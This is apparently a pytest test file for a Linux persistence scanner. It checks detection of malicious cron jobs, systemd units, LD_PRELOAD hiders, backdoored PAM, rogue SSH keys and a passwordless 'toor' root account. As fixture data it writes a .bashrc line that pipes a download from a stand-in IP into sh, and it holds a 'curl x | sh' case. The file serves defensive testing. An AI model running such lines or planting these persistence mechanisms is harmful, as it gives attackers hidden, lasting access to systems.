"""Linux persistence checks against a generated installation tree."""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from offscan import sandbox
from offscan.persistence import filepack, linux
from offscan.safefs import RootFS
from support.linuxroot import build_linux_root


@pytest.fixture
def linux_root(tmp_path: Path) -> Path:
    return build_linux_root(tmp_path / "root")


def _run(path: Path, in_sandbox: bool = False, home_volume: bool = False) -> dict:
    with RootFS(path) as root:
        args, fds = linux.collect(root, home_volume=home_volume)
    try:
        if in_sandbox:
            return sandbox.run("linux.persistence", args, fds, timeout=120)
        return linux.task_persistence(args, fds)
    finally:
        for fd in fds:
            os.close(fd)


def _find(result: dict, check: str, text: str = "") -> list[dict]:
    return [f for f in result["findings"] if f["check"] == check
            and (text in f["title"] or text in f["value"] or text in f["location"])]


def _one(result: dict, check: str, text: str = "") -> dict:
    found = _find(result, check, text)
    assert len(found) == 1, (check, text, found, [f["title"] for f in result["findings"]])
    return found[0]


def test_linux_findings(linux_root: Path) -> None:
    r = _run(linux_root)
    assert not r["errors"], r["errors"]

    assert _one(r, "linux.cron", "198.51.100.7")["severity"] == "high"
    assert _one(r, "linux.cron", "run-parts")["severity"] == "info"
    assert _one(r, "linux.cron", "e2scrub")["severity"] == "info"
    bob_cron = _one(r, "linux.cron", "/home/bob/.cache")
    assert bob_cron["user"] == "bob" and "runs at every boot" in bob_cron["reasons"]
    assert bob_cron["target"] == "/home/bob/.cache/.x/run"
    assert len(_find(r, "linux.at")) == 1                        # .SEQ is not a job

    evil = _one(r, "linux.systemd", "evil.service")
    assert evil["severity"] == "high" and "(enabled)" in evil["title"]
    assert evil["target"] == "/tmp/.x/payload"
    assert "/tmp/.x/payload" in r["targets"]
    assert _one(r, "linux.systemd", "rogue.service")["severity"] == "high"
    assert _one(r, "linux.systemd", "backup.service")["severity"] == "info"
    assert _one(r, "linux.systemd_timer", "backup.timer")["value"] == "activates backup.service"
    override = _one(r, "linux.systemd", "Override for nginx.service")
    assert override["severity"] == "high"
    assert not _find(r, "linux.systemd", "ssh.service")          # vendor units: only suspicious ones
    assert not _find(r, "linux.systemd", "getty")

    assert _one(r, "linux.ld_preload")["value"] == "/usr/lib/libprocesshider.so"
    assert _one(r, "linux.sshd", "PermitRootLogin")["severity"] == "low"
    assert _one(r, "linux.sshd", "AuthorizedKeysFile")["severity"] == "medium"
    keys = _find(r, "linux.ssh_key")
    assert len(keys) == 3
    assert {k["severity"] for k in keys if k["user"] == "bob"} == {"info", "high"}
    assert [k["severity"] for k in keys if k["user"] == "www-data"] == ["medium"]
    assert all(k["value"].split()[1].startswith("SHA256:") for k in keys)

    sudo_alias = _one(r, "linux.shell_rc", "alias sudo")
    assert sudo_alias["severity"] == "high" and sudo_alias["user"] == "bob"
    assert not _find(r, "linux.shell_rc", "HISTSIZE")
    assert not _find(r, "linux.shell_rc", "/opt/tools")
    autostart = _one(r, "linux.autostart")
    assert autostart["value"] == "/home/bob/.local/bin/upd --quiet" and autostart["user"] == "bob"

    accounts = {f["title"]: f for f in _find(r, "linux.account")}
    assert accounts["Second superuser account toor"]["severity"] == "high"
    assert accounts["Account toor has an empty password"]["severity"] == "high"
    assert accounts["Service account www-data can log in with a password"]["severity"] == "medium"
    assert accounts["Administrator accounts"]["value"] == "bob"
    assert "$6$" not in repr(r)                                 # password hashes never leave the sandbox

    assert _one(r, "linux.pam", "accepts any password")["severity"] == "high"
    assert _one(r, "linux.pam", "pam_evil")["severity"] == "high"
    assert "expose_authtok" in _one(r, "linux.pam", "PAM runs a program")["reasons"][0]
    assert _one(r, "linux.sudo", "www-data")["severity"] == "high"
    assert _one(r, "linux.udev", "usb-hook")["severity"] == "info"
    assert not _find(r, "linux.udev", "ata_id")
    assert _one(r, "linux.package_hook", "198.51.100.7")["severity"] == "high"
    assert _one(r, "linux.package_hook", "cnf-update-db")["severity"] == "info"
    assert _one(r, "linux.modprobe")["value"] == "/usr/local/bin/ld.sh"
    assert _one(r, "linux.boot")["severity"] == "high"
    assert _one(r, "linux.polkit")["severity"] == "high"
    assert _one(r, "linux.rc_local")["value"] == "/usr/local/bin/startup &"
    assert _one(r, "linux.hidden_name", "...")["severity"] == "high"
    assert _one(r, "linux.hidden_name", "/dev/.hidden-config")["severity"] == "medium"
    assert _one(r, "linux.temp_executable")["file"] == "/tmp/payload"
    assert not _find(r, "linux.script")                         # the motd script is harmless
    dbus = _one(r, "linux.dbus")                                 # vendor services are not listed
    assert dbus["user"] == "bob" and dbus["severity"] == "low"
    assert dbus["target"] == "/home/bob/.cache/.h/helper"
    assert _one(r, "linux.initramfs")["severity"] == "info"


def test_linux_persistence_in_sandbox(linux_root: Path) -> None:
    direct = _run(linux_root)
    boxed = _run(linux_root, in_sandbox=True)
    assert boxed["findings"] == direct["findings"]


def test_home_volume(tmp_path: Path) -> None:
    home = tmp_path / "home"
    (home / "alice/.config").mkdir(parents=True)
    (home / "alice/.bashrc").write_text("curl -fsSL http://198.51.100.9/i | sh\n")
    with RootFS(home) as root:
        assert linux.looks_like_home_volume(root)
    result = _run(home, home_volume=True)
    found = _one(result, "linux.shell_rc")
    assert found["user"] == "alice" and found["severity"] == "high"
    assert found["file"] == "/alice/.bashrc"


def test_symlink_escape_is_contained(tmp_path: Path) -> None:
    """A planted absolute link must resolve inside the target, never onto the host."""
    root = tmp_path / "root"
    (root / "etc").mkdir(parents=True)
    (root / "etc/crontab").symlink_to("/etc/hostname")       # host file
    (root / "etc/hostname").write_text("* * * * * root /inside/target\n")
    result = _run(root)
    assert _one(result, "linux.cron")["value"] == "/inside/target"


def test_pack_limits(tmp_path: Path) -> None:
    (tmp_path / "d").mkdir()
    for i in range(20):
        (tmp_path / f"d/f{i}").write_bytes(b"x" * 100)
    with RootFS(tmp_path) as root:
        pack = filepack.Packer(max_total=1000)
        pack.add_tree(root, "/d", "x")
        fd, index = pack.finish()
        try:
            assert pack.full and sum(e["length"] for e in index) <= 1000
            with pytest.raises(OSError):
                os.pwrite(fd, b"y", 0)                       # sealed
            data = [d for _e, d in filepack.entries(fd, index)]
            assert data[0] == b"x" * 100
        finally:
            pack.close()


@pytest.mark.parametrize(("command", "target"), [
    ("/usr/bin/python3 /opt/app/run.py --x", "/opt/app/run.py"),
    ("FOO=1 nice -n 5 /usr/local/bin/job", "/usr/local/bin/job"),
    ("bash -c 'curl x | sh'", None),
    ("-/sbin/agetty -o '-p' %I", "/sbin/agetty"),
    ("cd / && run-parts --report /etc/cron.hourly", None),
    ("/bin/sh /etc/rc.boot", "/etc/rc.boot"),
])
def test_command_target(command: str, target: str | None) -> None:
    assert linux.command_target(command) == target
